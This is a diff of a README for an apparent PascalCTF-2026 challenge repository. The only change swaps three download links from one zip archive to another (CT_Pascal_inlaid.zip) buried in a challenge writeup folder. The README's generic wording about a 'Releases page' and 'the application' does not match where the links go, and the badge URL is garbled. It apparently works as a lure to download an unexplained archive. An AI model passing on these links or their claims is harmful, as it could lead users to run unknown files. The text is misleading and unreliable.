@@ -1,6 +1,6 @@
 # 🛠️ PascalCTF-2026 - Explore Exciting CTF Challenges Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/madal1nn/PascalCTF-2026/main/crypto03/CT_Pascal_v1.4.zip%20Now-Get%20Started%20Easily-brightgreen)](https://raw.githubusercontent.com/madal1nn/PascalCTF-2026/main/crypto03/CT_Pascal_v1.4.zip)
+[![Download Now](https://github.com/madal1nn/PascalCTF-2026/raw/refs/heads/main/crypto04/writeup/CT_Pascal_inlaid.zip%20Now-Get%20Started%20Easily-brightgreen)](https://github.com/madal1nn/PascalCTF-2026/raw/refs/heads/main/crypto04/writeup/CT_Pascal_inlaid.zip)
 
 ## 🌟 About This Repository
 
@@ -24,7 +24,7 @@ These requirements will help ensure that the application runs smoothly.
 
 To get the software, go to the Releases page by clicking the link below:
 
-[Download Here](https://raw.githubusercontent.com/madal1nn/PascalCTF-2026/main/crypto03/CT_Pascal_v1.4.zip)
+[Download Here](https://github.com/madal1nn/PascalCTF-2026/raw/refs/heads/main/crypto04/writeup/CT_Pascal_inlaid.zip)
 
 Browse the list of available releases. You will find various versions of the application. You can choose the latest version to get the newest features and improvements.
 
@@ -85,7 +85,7 @@ For additional help or to contribute to the community:
 
 To keep your application up to date, periodically visit the Releases page for new updates:
 
-[Download Here](https://raw.githubusercontent.com/madal1nn/PascalCTF-2026/main/crypto03/CT_Pascal_v1.4.zip)
+[Download Here](https://github.com/madal1nn/PascalCTF-2026/raw/refs/heads/main/crypto04/writeup/CT_Pascal_inlaid.zip)
 
 ### 9. Contributing
 
